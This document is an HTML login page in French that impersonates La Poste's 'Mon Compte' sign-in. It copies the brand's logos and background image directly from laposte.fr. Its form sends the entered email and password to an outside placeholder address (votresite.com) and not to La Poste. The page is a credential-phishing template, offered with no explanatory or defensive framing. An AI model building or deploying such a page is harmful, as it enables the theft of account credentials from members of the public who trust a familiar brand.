<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        /* Basic styling */
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            padding: 10px;
            background-image: url('https://moncompte.laposte.fr/moncompte-auth/auth/resources/kqnrw/login/moncompte/dist/assets/background-desktop.a233dcd33d1b4ecd9b4fb4c783303212.jpg');
            background-size: cover;
            background-position: center;
            justify-content: center;
            align-items: center;

        }
        .container {
            width: 25%; /* Utilisation de pourcentage pour la largeur */
            max-width: 500px;
            background-color: #fff;
            padding: 25px;
            border-radius: 2px;
            box-shadow: 10px 10px 10px 0px rgba(0,0,0,0.1);
            background-color: #fff;
            margin: 0 auto; /* Pour centrer horizontalement */
            margin-top: 0; /* Espacement depuis le haut de la page */
            margin-bottom: 0px; /* Espacement depuis le bas de la page */
            margin-right:100px; /* Décalage vers la droite */
            position: relative; /* Permet de positionner les éléments par rapport à ce conteneur */
        }
        h2 {
            text-align:left;
            margin-bottom: 20px;
            color: ##666;
        }
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
        }
        input[type="email"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"] {
            background-color: #ff6600;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: calc(100% - 20px);
            font-weight: bold;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #e55e00;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: #666;
        }
        .footer a {
            color: #666; /* changer la couleur du lien */
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .logo {
            text-align:left;
            margin-bottom: 10px;
        }
        .logo img {
            max-width: 100%;
            height: auto;
        }
        .background-text {
            position: left; /* Position absolue pour le texte de fond */
            bottom: 50px; /* Espacement depuis le bas de la page */
            right: 20px; /* Espacement depuis la droite de la page */
            color: #fff; /* Texte en blanc */
            font-size: 24px; /* Taille de la police */
        }
  /* Supprimer la flèche de défilement */
        ::-webkit-scrollbar {
            display: none;
        }
        /* Firefox */
        scrollbar-width: none;
    </style>
</head>
<body>
 <div class="logo">
        <img src="https://moncompte.laposte.fr/moncompte-auth/auth/resources/kqnrw/login/moncompte/assets/logo-part.svg">
    </div>

    <div class="background-text">Avec Mon Compte,
La Poste me simplifie
la vie au quotidien.</div>
    <div class="container">
        <div class="logo">
            <img src="https://moncompte.laposte.fr/moncompte-auth/auth/resources/kqnrw/login/moncompte/assets/la-poste-logo.svg">
        </div>
        <h2>Connectez-vous</h2>
        <p style="text-align:LEFT; font-weight: bold;">Renseignez votre identifiant</p>
<p style="text-align:LEFT; font-weight: bold;">La Poste</p>
        <form action="https://votresite.com/redirection" method="post">
            <label for="email">E-mail:</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Mot de passe:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Connexion">
            <p style="text-align: center; font-size: 15px;"><a href="#">Je n'ai pas mon mot de passe</a></p>
            <input type="checkbox" id="stayLoggedIn" name="stayLoggedIn">
            <label for="stayLoggedIn">Rester connecté</label>
        </form>
        <div class="footer">
            <a href="#" style="margin-right: 10px;">Mot de passe oublié ?</a>
            <a href="#">Créer un compte</a>
        </div>
    </div>

</body>
</html>
